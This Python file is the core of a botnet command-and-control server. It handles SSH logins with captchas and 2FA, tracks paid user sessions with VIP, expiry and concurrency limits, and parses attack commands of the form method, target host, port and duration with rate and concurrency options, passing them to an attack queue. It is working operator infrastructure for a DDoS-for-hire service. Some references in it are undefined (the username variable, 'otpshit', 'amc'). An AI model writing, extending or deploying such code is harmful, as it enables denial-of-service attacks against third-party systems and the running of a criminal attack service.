import socket, random, base64, requests, threading, time, string, sys, os, json, hashlib, paramiko, traceback, ipaddress, shlex
import pyotp, qrcode, qrcode.console_scripts, pyfiglet # for captchas
from datetime import datetime
from src.env import env
from src.utils import *
from src.attacks import *
from src.database import users, attacks
from src.commands_registry import COMMANDS

# debugging option when the cnc automatically crashes
autoactive_debug = False

class core: # Main Core
    def rstring(length=4):
        characters = string.ascii_letters + string.digits
        random_string = ''.join(random.choice(characters)+' ' for _ in range(length))
        return [random_string, random_string.replace(' ', '')]
    def findsessions(user, addr, rdata=False):
        for session in list(env['users']['clients'].keys()):
            if env['users']['clients'][session]['addr'] == addr or env['users']['clients'][session]['user'] == user:
                if not rdata:
                    return 1
                return env['users']['clients'][session]
        return 0
    def twofactor(username):
        secret = pyotp.random_base32()
        totp = pyotp.TOTP(secret)
        otpauth_url = totp.provisioning_uri(f"OTP - {env['cnc']['name'].lower().replace(' ', '')}", issuer_name=env['cnc']['name'])
        # generate the qr code
        qr = qrcode.QRCode(
        version=1,  # Tamanho mínimo do QR code
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=1,  # Tamanho do box (diminuir a altura)
        border=1  # Largura da borda ao redor do QR code
        )
        qr.add_data(otpauth_url)
        qr.make(fit=True)
        # prints qr code on screen
        # qr.print_ascii(invert=True)
        
        qr_matrix = qr.get_matrix()
        
        # Converts matrix to qr code ascii
        qr_list = ['']
        for row in qr_matrix:
            line = f''.join(['██' if cell else '  ' for cell in row])
            qr_list.append(c.BG_WHITE+c.BLACK+line+c.R)
        return secret, qr_list
    def load(sock, user):
        while env['users']['clients'][sock]:
            try:
                processedmotd = process(env['cnc']['MOTD'], sock, is_title=True)
                if not isinstance(processedmotd, list):
                    settitle(sock, processedmotd)
                    time.sleep(0.75)
                else:
                    for i in processedmotd:
                        settitle(sock, i)
                        time.sleep(0.5)
            except Exception as e:
                print(f'[{c.RED}Info{c.R}] user "{user}" exited')
                if e != "Socket is closed":
                    log(
                        'Debug',
                        f'Error in title loader: {e}'
                    )
                try:
                    sock.close()
                except:
                    pass
                try:
                    del env['users']['clients'][sock]
                except Exception as e:
                    pass
                return
    def parse_command(command: str):
        if not command or not isinstance(command, str):
            return {
                "cmd": '',
                "args": []
            }
        try:
            parts = shlex.split(command.strip())
        except ValueError:
            return {
                "cmd": '',
                "args": []
            }
        if not parts:
            return {
                "cmd": '',
                "args": []
            }
        return {
            "cmd": parts[0],
            "args": parts[1:]
        }
    def can_use_command(cmd, user, sock):
        is_admin = user in env['users']['roots']
        is_vip = env['users']['clients'][sock]['vip']

        only_admin = 'admin' in cmd.get('permissions', [])
        only_vip   = 'vip'   in cmd.get('permissions', [])

        if only_admin and not is_admin:
            return False

        if only_vip and not is_vip and not only_admin:
            return False

        if only_admin and only_vip and not is_admin:
            return False

        return True
    def captchas_2fa(sock):
        response, finalx = '', ''
        match env['core']['security-level']:
            case 1:
                y, x = random.randint(1, 20), random.randint(1, 20)
                finalx = y+x
                send(sock, f'calculate: {c.BG_WHITE+random.choice([c.BLACK, c.RED, c.YELLOW])+" "+str(y)} + {str(x)+" "+c.R} = ')
                try:
                    response = int(receive(sock))
                except Exception as e:
                    print(e)
                    return
            case 2:
                finalx = core.rstring(5)
                asciix = pyfiglet.Figlet(font=random.choice(['slant', 'standard', '3-D', 'banner'])).renderText(finalx[0]).splitlines()
                for i in asciix:
                    send(sock, f'{c.BG_WHITE+c.BLACK+i+c.R}\n')
                send(sock, f'\nWrite back the ascii(example: UxGZw): ')
                finalx=finalx[1]
                response = receive(sock)
            case 3:
                finalx = random.choice(['bus', 'computer', 'apple', 'linux', 'controller'])
                asciix = random.choice(capimages[finalx]).splitlines()
                for i in asciix:
                    send(sock, f'{i}\n')
                send(sock, f'\nWhat is that(example: apple): ')
                response = receive(sock)
            case 4:
                u = users.get(username)
                otpcheck = u['otp']
                if otpcheck:
                    magic, qcode = core.twofactor(username)
                    send(sock, 'Scan this with the preferred 2FA application.\n')
                    send(sock, f'Secret: {magic}.\n')
                    send(sock, 'After that put the 6 digits code.')
                    for i in qcode:
                        send(sock, f'{i}\n')
                    sock.settimeout(600)
                    finalx = True

                    for i in range(3):
                        send(sock, f'Two Factor authenticator {i+1}/3 try.\n\n{c.BG_WHITE+c.BLACK} _ _ _ _ _ _ \r ')
                        response = receive(sock, justnumbers=True, limitc=6, returnset='%c ')
                        response = pyotp.TOTP(magic).verify(response)
                        if response == True:
                            users.update(username, otp=magic)
                            break
                        else:
                            send(sock, 'Invalid 2FA code, try again\n')
                else:
                    sock.settimeout(600)
                    finalx = True
                    for i in range(3):
                        send(sock, f'Two Factor authenticator {i+1}/3 try.\n\n{c.BG_WHITE+c.BLACK} _ _ _ _ _ _ \r ')
                        response = receive(sock, justnumbers=True, limitc=6, returnset='%c ')
                        response = pyotp.TOTP(otpshit[1]).verify(response)
                        if response == True:
                            break
                        else:
                            send(sock, 'Invalid 2FA code, try again\n')
            case 0:
                pass
            case _:
                settitle(sock, "Captcha")
                send(sock, '\033[0mcaptcha, please confirm you\'re a human:\n')
        return response, finalx
    def login(sock, addr):
        try:
            sock.settimeout(240)
            transport = paramiko.Transport(sock)
            transport.local_version = env['core']['ssh-banner']
            server    = Server()
            host_key  = env['core'].get('host-key')
            if not host_key:
                host_key = paramiko.RSAKey(filename=env['core']['server-key'])
                env['core']['host-key'] = host_key
            transport.add_server_key(host_key)
            transport.start_server(server=server)
            sock      = transport.accept(100)
            cred      = server.get_credentials()
            username, password = cred['user'], cred['passwd']
            response, finalx = core.captchas_2fa(sock)
            if response == finalx and env['core']['security-level'] >= 0 and env['core']['security-level'] <= 4:
                for i in spinner:
                    send(sock, f' [{c.RED}{i}{c.R}] checking if you\'ve an valid login...\r')
                    time.sleep(0.25)
                check = users.login(username, password)
                if not check:
                    send(sock, f'\r Invalid login or password.              \r')
                    log(
                        'LoginCore',
                        f"Login failed: {username} | ip: {addr[0]}"
                    )
                    time.sleep(3)
                    sock.close()
                    return
                if core.findsessions(username, addr[0]) == 1:
                    send(sock, f' You\'re already in a session.              \r')
                    time.sleep(3)
                    sock.close()
                    return
                if check['expiry'] <= int(time.time()):
                    send(sock, f' [{c.RED}{i}{c.R}]  Your login is currently expired, renew.\r')
                    time.sleep(3)
                    sock.close()
                    return
                for i in spinner:
                    send(sock, f' [{c.RED}{i}{c.R}]  Alright {username}, pluging you to main server...\r')
                    time.sleep(0.25)
                send(sock, '\n')
                env['users']['clients'][sock] = {
                    "user": username,
                    "uptime": int(time.time()),
                    "addr": addr[0],
                    "concurrents": check['concurrents'],
                    "boottime": check['boottime'],
                    "created_by": check['created_by'],
                    "expiry": check['expiry'],
                    "vip": True if check['vip'] == 1 else False,
                    'debug': autoactive_debug
                }
                print(f"[{c.GREEN}Login{c.R}] {username} logged in.")
                core.handler(sock, username)
            else:
                send(sock, f'Wrong answer, closing connection.')
                time.sleep(3)
                sock.close()
                return
        except Exception as e:
            log(
                "Debug",
                f"Login system crashed: {traceback.format_exc()}"
            )
            try:
                sock.close()
            except:
                pass
            return
    def handler(sock, user):
        """
        Handles a single client connection.
        """

        def is_connected():
            return sock in env["users"]["clients"]

        def remove_client():
            env["users"]["clients"].pop(sock, None)

        # ------------------------------------------------------------------
        # Client initialization
        # ------------------------------------------------------------------

        env["users"]["user-command-history"][user] = []
        sock.settimeout(84600)   # 24 hours
        threading.Thread(
            target=core.load,
            args=(sock, user),
            daemon=True,
            name=f"load-{user}"
        ).start()                # PuTTY title manager.
        last_cmd = 0
        try:
            # Banner
            send(sock,
                process(
                    banners(env['cnc']['default_banners'].get('welcome', 'banner.tfx')),
                    sock
                )
            )
            rate_limit_occurs = 0
            while is_connected():

                # ----------------------------------------------------------
                # Command line
                # ----------------------------------------------------------

                send(sock, 
                    process(
                        env["cnc"]["command-line"],
                        sock
                    )
                )

                # ----------------------------------------------------------
                # Receive commands
                # ----------------------------------------------------------

                try:
                    if time.time()-last_cmd > env['cnc']['rate-limit-mc']:
                        last_cmd = time.time()
                        raw_command = receive(
                            sock,
                            user=user,
                            debug=env['users']['clients'][sock]['debug']
                        )
                    else:
                        if rate_limit_occurs > 5:
                            break
                        elif rate_limit_occurs < 5 and time.time()-last_cmd > env['cnc']['rate-limit-mc']:
                            rate_limit_occurs = 0
                        send(sock, '\n\x1b[31mrate limit, wait 5 seconds to proceed\x1b[0m\n')
                        time.sleep(5)
                        continue
                    if raw_command is None:
                        break

                    command = core.parse_command(raw_command)
                except socket.timeout:
                    log(
                        "System",
                        f"Client {user} timed out."
                    )
                    break
                except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
                    break
                except Exception as e:
                    log(
                        "System debug",
                        f"Failed to parse command from {user}: {e}"
                    )
                    if env['users']['clients'][sock]['debug']:
                        log(
                            "Debug Analysis",
                            traceback.format_exc()
                            )
                    continue

                # ----------------------------------------------------------
                # Validate parsed command
                # ----------------------------------------------------------

                if not isinstance(command, dict):
                    log(
                        "System debug",
                        f"Invalid command object from {user}: {command!r}"
                    )
                    continue

                command_name = command.get("cmd", "")
                if not isinstance(command_name, str):
                    command_name = ""

                # ----------------------------------------------------------
                # Command history
                # ----------------------------------------------------------

                if command_name and not command_name.startswith("#"):
                    history = env["users"]["user-command-history"].setdefault(
                        user,
                        []
                    )
                    history.append(core.parse_command(raw_command))
                    if env['users']['clients'][sock]['debug']:
                        print(command)

                # ----------------------------------------------------------
                # Local commands
                # ----------------------------------------------------------

                cmd = COMMANDS.get(command_name)
                if cmd is not None:
                    if not core.can_use_command(cmd, user, sock):
                        send(
                            sock,
                            f"{process(env['core']['errors'].get('403', 'Permission denied'), sock)}\n"
                        )
                        continue
                    try:
                        available = {
                            "sock": sock,
                            "user": user,
                            "receive": receive,
                            "command": command,
                        }
                        kwargs = {
                            name: available[name]
                            for name in cmd["needs"]
                            if name in available
                        }
                        cmd["def"](**kwargs)
                    except Exception as e:
                        send(sock, f"{process(env['core']['errors'].get('500', 'Something went wrong'),sock)}\n")
                        log(
                            "Debug",
                            f'Command "{command_name}" crashed: {e}'
                        )
                        if env['users']['clients'][sock]['debug']:
                            log(
                                "Debug Analysis",
                                traceback.format_exc()
                                )
                    continue

                # ----------------------------------------------------------
                # CNC commands
                # ----------------------------------------------------------

                cnc_command = env["cnc"]["commands"].get(command_name)
                if not cnc_command:
                    for i, acmd in env["cnc"]['aliases'].items():
                        if i == command_name:
                            cnc_command  = env["cnc"]["commands"].get(acmd)
                            command_name = acmd
                            break

                if cnc_command is not None:
                    if not core.can_use_command(cnc_command, user, sock):
                        send(
                            sock,
                            f"{process(env['core']['errors'].get('403', 'Permission denied'), sock)}\n"
                        )
                        continue
                    try:
                        send(sock, 
                            process(
                                banners(cnc_command.get('banner')),
                                sock,
                                addbreak=True
                        ))
                    except Exception as e:
                        send(sock, f"{process(env['core']['errors'].get('500', 'Something not worked'),sock)}\n")
                        log(
                            "Debug",
                            f'CNC command "{command_name}" crashed: {e}'
                        )
                        if env['users']['clients'][sock]['debug']:
                            log(
                            "Debug Analysis",
                            traceback.format_exc()
                            )
                    continue

                # ----------------------------------------------------------
                # Attack vectors
                # ----------------------------------------------------------

                if command_name.startswith(env['funnel']['prefix']):
                    command_name = command_name.replace(env['funnel']['prefix'], '')
                    args = command.get("args", [])

                    method = env["funnel"]["methods"].get(command_name)

                    if method is None:
                        send(sock, "Method not found.\n")
                        continue

                    if len(args) < 3:
                        send(
                            sock,
                            f"Usage: {command_name} <host> <port> <duration>\n"
                        )
                        continue

                    # Parsing
                    host = args[0]

                    try:
                        port = int(args[1])
                        duration = int(args[2])
                    except ValueError:
                        send(
                            sock,
                            "Port and duration must be integers.\n"
                        )
                        continue

                    # optional arguments
                    concurrents = 1
                    length = 0
                    rps = 0
                    geolocation = 0

                    if len(args) >= 4:
                        try:
                            concurrents = int(args[3])
                        except ValueError:
                            send(sock, "Invalid concurrency value.\n")
                            continue

                    if len(args) >= 5:
                        try:
                            length = int(args[4])
                        except ValueError:
                            send(sock, "Invalid length value.\n")
                            continue

                    if len(args) >= 6:
                        try:
                            rps = int(args[5])
                        except ValueError:
                            send(sock, "Invalid RPS value.\n")
                            continue

                    if len(args) >= 7:
                        geolocation = args[6]

                    valid, result = amc.validate_job(
                        user=user,
                        method=command_name,
                        host=host,
                        duration=duration,
                        port=port,
                        concurrents=concurrents,
                        length=length,
                        rps=rps,
                        geolocation=geolocation,
                    )

                    if not valid:
                        send(
                            sock,
                            f"{result}\n"
                        )
                        continue

                    send(sock,
                        process(
                            banners(env['cnc']['default_banners'].get('sent_attack', 'attack_sent.tfx')),
                            sock,
                            is_attack=result,
                            addbreak=True
                    ))
                    continue

                # ----------------------------------------------------------
                # Unknown command
                # ----------------------------------------------------------

                if not command_name.startswith("#") and command_name != '':
                    send(
                            sock,
                            f"{process(env['core']['errors'].get('404', 'Not found'), sock)}\n"
                        )
        except socket.timeout:
            log(
                "System",
                f"Client {user} timed out."
            )
        except (
                ConnectionResetError,
                BrokenPipeError,
                ConnectionAbortedError
            ):
            log(
                "System",
                f"Client {user} disconnected."
            )
            return
        except Exception as e:
            log(
                "Debug",
                f"Handler for {user} crashed: {e}"
            )
            if env['users']['clients'][sock]['debug']:
                log(
                    "Debug Analysis",
                    traceback.format_exc()
                    )
            return
        finally:
            remove_client()
            try:
                sock.close()
            except Exception:
                pass
            env["users"]["user-command-history"].pop(sock, None)
            log(
                "System",
                f"Connection closed for {user}."
            )

class Server(paramiko.ServerInterface):

    def __init__(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
    
    def get_allowed_auths(self, username):
        return "password"

    def check_auth_password(self, username, password):
        self.username = username
        self.password = password
        return paramiko.AUTH_SUCCESSFUL    
    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

    def check_channel_exec_request(self, channel, command):
        command = str(command)
        return True

    def get_credentials(self):
        return {'user': self.username, 'passwd': self.password}

